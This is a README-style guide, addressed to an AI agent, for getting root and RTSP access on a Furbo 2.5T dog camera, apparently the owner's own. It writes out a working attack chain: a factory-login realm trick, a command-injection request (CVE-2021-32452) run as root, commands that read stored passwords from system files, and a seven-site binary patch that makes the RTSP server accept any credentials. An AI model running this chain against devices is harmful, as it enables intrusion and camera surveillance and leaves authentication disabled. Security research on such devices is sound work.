# furbo-rtsp
get your si agent to get credentials to your own Furbo dog camera.



# Furbo 2.5T: getting the web and RTSP logins on your own camera

A field guide for an AI agent working on an owner's Furbo Dog Camera (model 2.5T, Ambarella S2L, board `S2LM_FURBO25`) on the owner's own LAN. Everything here was done over the network with no hardware access. Verify each step before moving on, and keep commands small — the camera's CGI is fragile.

Bottom line up front:

- Web login: `admin` / `admin`, sent with digest realm **`ycam.com`** (not the realm the camera challenges with).
- Root shell: command injection in `ldc.cgi` (CVE-2021-32452) using that web login.
- RTSP password: read it off the camera with the root shell. It is per-device (on ours it was a 6-character string), stored in three places that must agree.
- **The stock RTSP server can never authenticate a remote client, no matter the password.** Two bugs make the digest path dead code and a third gates everything on source IP `127.0.0.1`. The working end state is a 7-instruction patch to `/usr/lib/libamprotocol-rtsp.so.2.0.0` plus a reboot. After that, plain `rtsp://<user>:<pass>@<ip>:554/stream0` works in ffmpeg/VLC.
- Expect the middle of this process to feel like a setback: you will have the correct RTSP password early and it will keep failing with 401. That is not your mistake and not a stale nonce. Skip to section 6 and do not waste time brute-forcing digest variants — every variant fails because the comparison code is unreachable.

## 1. Recon

Find the camera on the LAN (UniFi client list, or scan the IoT VLAN). Confirm the fingerprint:

| Port | Expect |
| --- | --- |
| 80, 443 | lighttpd/1.4.40, 401 with digest realm `ambarella` |
| 554 | RTSP, 401 on DESCRIBE with digest realm `chicony.com` |
| 8080 | closed (the demo preview port never runs) |

TLS cert on 443 is the Ambarella SDK sample (`CN=zkyang`, expired). It is not a password. Sensor is 1920x1080 (`/cgi-bin/get_vin.cgi` reports it once you are logged in).

Use 443 (HTTPS, ignore the cert) for all web work. Port 80's connection queue jams easily under load; 443 keeps working.

## 2. Web login (the realm mismatch)

`/etc/lighttpd/webpass.txt` on the camera stores `admin:ycam.com:913fd17138fb6298ccf77d3853ddcf9f`, which is `MD5(admin:ycam.com:admin)`. But lighttpd challenges with realm `ambarella`. A client that hashes with the challenged realm always fails.

So: send username `admin`, password `admin`, but put `realm="ycam.com"` in the Authorization header and hash `HA1 = MD5("admin:ycam.com:admin")`. Compute everything else (nonce, uri, qop) normally from the challenge. Returns 200.

This is the published factory account (Somerset Recon, "Hacking the Furbo Dog Camera: Part II", Oct 2021).

## 3. Root shell (CVE-2021-32452)

Same auth as above. The request:

```
GET /cgi-bin/ldc.cgi?mode=;<url-encoded command>; HTTP/1.1
Host: <ip>
Authorization: Digest username="admin", realm="ycam.com", nonce="...", ...
```

The CGI builds `/usr/local/bin/test_ldc ... -m <injected> ...` and calls `system()` as root. The response body contains the command output followed by the echoed `test_ldc` command line. `stderr` is included (you will see a harmless `unknown option found: 63` from `test_ldc` on every run).

Working quirks you must respect:

- **Two shell passes.** The injected string reaches `sh` twice; quotes do not survive to protect the second pass. Anything with `|` inside a quoted argument (e.g. `grep -E "a|b"`) gets split into real pipes and misfires. Use one pattern per grep, no internal pipes or spaces in patterns where possible.
- **Length limit ~120 characters** of injected command. Long command chains get silently truncated mid-command. One or two short statements per request.
- **HTTP 500 from the CGI often still executed your command.** The 500 is an output-stage failure. Verify side effects (the file you created, the bytes you wrote) before re-sending. Never assume 500 = nothing ran.
- **Response truncation.** Long output is cut (~1–2 KB). Run commands that print little. `od`/`strings` small ranges, `grep -c` instead of dumping files. Note: busybox `grep -abo` is broken (returns nothing) — use `grep -c` or `od` reads at computed offsets.
- **Watchdog.** Killing/stressing services can trip a watchdog that power-cycles the camera (~50 s to come back). It recovers by itself; just wait for 443 to answer 401 again.

Wrap this in a script (see `ldc_inject.py`): first request unauthenticated to harvest the nonce, then the authorized request. Keep a 2–3 s gap between injected commands; the camera is slow.

## 4. Read the RTSP password

With the root shell, read all three locations. They must agree:

```
cat /etc/Account.txt            # one line: admin:0:<password>
od -c /dev/adc/furbo2_rtsp.password   # exactly the password, no newline
od -c /etc/webpass.txt          # admin:chicony.com:<32-hex>
```

Cross-check: `MD5(admin:chicony.com:<password>)` must equal the hash in `/etc/webpass.txt` — on our unit all three sources agreed. RTSP username is `admin`, realm is `chicony.com` (as challenged).

The password is per-device — there is no universal value, and you cannot skip this step by guessing.

At this point you have the RTSP login on paper. **It will not work yet.** That is expected. Continue.

## 5. Quick sanity checks that save time later

- `rtsp_server.acs` config: `/etc/oryx/apps/rtsp_server.acs` holds `rtsp_server_user_db = /etc/webpass.txt`, `need_auth = true`, `max_client_num = 5` (five client slots — space your RTSP attempts 2–3 s apart or the listener stops accepting, which looks like the camera died but is just saturation), and four streams (`video0..video3` + `aac-16k`).
- The process is `rtsp_svc` (one process owns port 554; `netstat -tlnp | grep 554`). Internal services (`media_svc`, `tfp2pd`) hold permanent RTSP sessions over loopback — that is the only client flow the vendor ever exercises.
- `/proc/$(pidof rtsp_svc)/mem` is readable and writable as root from the CGI shell (verify: read 4 bytes at the `r-xp` map start of `libamprotocol-rtsp.so.2.0.0`; they will be `7f 45 4c 46`). This works and is how you dump/verify memory.

## 6. Why the correct password still gets 401 (do not skip)

Extract the RTSP library for analysis: copy `/usr/lib/libamprotocol-rtsp.so.2.0.0` into the lighttpd web root (`server.document-root = /webSvr/web/`), download it over HTTPS with the section-2 digest, then delete the copy from the web root. It is a stripped ARM (Thumb) ELF, ~76 KB. md5 the camera file and your download to confirm they match before analyzing.

Disassemble as **Thumb** (binutils `objdump -d` defaults to ARM mode here and produces garbage — use capstone with `CS_MODE_THUMB`, resolving `ldr rX,[pc,#imm]` + `add rX,pc` literal-pool pairs). Three findings, each independently fatal to remote RTSP auth:

1. **Source-IP gate.** Both request handlers start with `strncmp(request->[0x44], "127.0.0.1", 9)`. Non-loopback falls straight into the 401 block. The auth header is never even parsed. (Offset 0x43d2 in handler 1 at 0x43a8; 0x474e in handler 2 at 0x4724. The same compare reappears at each handler's tail: 0x44ba and 0x4830.)
2. **Dead digest parser.** `parse_authentication_header` (offset 0x38f4, format strings `%[^=]="%[^"]"` plus field names `username/realm/nonce/uri/response`) is never called from anywhere. The parsed-auth fields at request+0x148..0x158 stay NULL, so the pre-checks fail even for loopback clients.
3. **Broken `authenticate`** (offset 0x81f8) even if reached: it hashes `nonce:HA1:HA2` in a swapped component order, and the db loader's `fscanf("%[^:]:%[^:]:%[^:]:")` swallows the trailing newline into the stored hash.

Consequence: no digest exchange from any remote client can ever succeed, with any password. Do not spend turns trying nonce/uri/qop/field-order variants (we tried ~40, including hand-rolled RTSP clients; all 401). The library must be patched.

## 7. The patch

Seven sites in the file (file offset == runtime offset in this ELF; both handlers' `beq` targets and the gate calls were located by the analysis above). Patch the **file on disk**, in place, with busybox `dd` (patch payload files built with `printf` octal escapes):

| File offset | Original | Patched | Meaning |
| --- | --- | --- | --- |
| 0x81f8 | `2d e9 f0 4f` | `01 20 70 47` | `authenticate`: `movs r0,#1; bx lr` (always succeed) |
| 0x4544 | `f8 d0 90 15` | `47 e0` | handler 1: `b 0x45d6` (skip NULL-field pre-checks, go to the auth call) |
| 0x4842 | `f8 d0 90 15` | `45 e0` | handler 2: `b 0x48d0` (same) |
| 0x43d2 | `blx strncmp` | `00 20 00 bf` | gate: `movs r0,#0; nop` (always "matches") |
| 0x44ba | `blx strncmp` | `00 20 00 bf` | gate tail check, handler 1 |
| 0x474e | `blx strncmp` | `00 20 00 bf` | gate, handler 2 |
| 0x4830 | `blx strncmp` | `00 20 00 bf` | gate tail check, handler 2 |

**Encoding trap, the single costliest mistake:** `movs r0,#0` is `00 20` (bytes `00 20`). Bytes `01 20` are `movs r0,#1` — the exact opposite behavior, which makes the gates reject everyone and you get 401 again while every byte-level "verification" still looks fine. If your patch verifies but the camera still 401s, re-derive the encoding by hand.

**Why patch the file instead of live memory:** `/proc/pid/mem` writes land and read back correctly, but the running process keeps executing stale I-cache lines on the hot path, and the loopback pipeline warms those exact lines within seconds of boot. Live patching loses that race permanently. Patching the on-disk file and rebooting means the first-ever instruction fetch reads your bytes.

Procedure:

1. Back up: `cp /usr/lib/libamprotocol-rtsp.so.2.0.0 /usr/lib/rtsp-lib-backup.bin` (note the original md5; ours was `ecd72214e238f463c8894f078177f35`).
2. Write the seven patches with `dd ... conv=notrunc` at the decimal offsets (0x81f8=33272, 0x4544=17732, 0x4842=18498, 0x43d2=17362, 0x44ba=17594, 0x474e=18254, 0x4830=18480), **one dd per injected command** (long chains truncate), then read each back and compare bytes before moving on.
3. Reboot (`reboot` via the injection; the request will time out as the camera drops — that is fine). Wait for 443 to answer 401 again (~50 s).

## 8. Restart gotchas (if you try to avoid a full reboot)

You don't need these if you follow the reboot path, but they explain strange states:

- `rtsp_svc` ignores SIGTERM. SIGKILL works but leaves a **defunct PID** that is never reaped, and `/tmp/rtsp_svc.pid` still points at it, so a manually started instance exits immediately with "already running". Fix: `echo 0 > /tmp/rtsp_svc.pid` before starting `/usr/bin/rtsp_svc &`.
- After SIGKILL, apps_launcher does **not** reliably respawn the service; the heartbeat watchdog eventually reboots the whole camera anyway. Just reboot deliberately.

## 9. Verify

```
ffprobe -hide_banner -v error -rtsp_transport tcp \
  -show_entries stream=codec_name -of compact \
  rtsp://admin:<password>@<ip>:554/stream0
# expect: stream|codec_name=h264  and  stream|codec_name=aac
```

- `/stream0` through `/stream3` and `/stream` all serve h264+aac SDP; `/` is 404.
- **Audio flows immediately; video packets only flow while the camera's H.264 encoder is active** (Furbo app live view, bark-alert clip, cloud recording). If you get SDP plus AAC but no frames, trigger a live view from the owner's Furbo app and re-test — do not go re-patching.
- A 12-second `ffmpeg -c copy` capture showing ~16 kb/s AAC with zero video is the normal idle state, not a failure.

## 10. Revert

```
cp /usr/lib/rtsp-lib-backup.bin /usr/lib/libamprotocol-rtsp.so.2.0.0
reboot
```

Stock behavior returns (401 for all remote RTSP). The patched library accepts any credentials; the owner should keep it LAN-only behind the IoT VLAN as before.

## Timeline of the setbacks (so you recognize them)

1. Password found within minutes of the first root shell — then hours of 401. The digest-brute-forcing detour (realm variants, swapped hash orders, newline-in-hash, field orderings, no-qop RFC 2069) was wasted motion: the check was unreachable. Lesson: **read the code before guessing formulas.**
2. Live memory patches verified byte-for-byte yet had no effect — stale I-cache on a hot path fed by an internal loopback client. Lesson: **verify execution, not memory** (we confirmed by patching the 401 string — data reads are coherent and the response changed, proving the response came from the patched process while its instructions stayed stale).
3. A patch that read back perfectly but inverted one immediate (`01 20` vs `00 20`), producing exactly the failure it was meant to remove.
4. Busybox oddities (silent `grep -abo`, silent `dd` stats), CGI truncation at ~120 chars, and 500 responses that still executed — each one can masquerade as "the command failed." Verify side effects, never status codes, on this target.

## Sources

- Somerset Recon, "Hacking the Furbo Dog Camera: Part II" (2021): https://www.somersetrecon.com/blog/2021/hacking-the-furbo-dog-camera-part-ii
- Somerset Recon PoC: https://github.com/Somerset-Recon/furbo-research (`command-injection/furbo_ldc_cmd_inj.py`)
- CVE-2021-32452 (ldc.cgi injection), CVE-2020-24918 (RTSP `parse_authentication_header` overflow — not needed here).

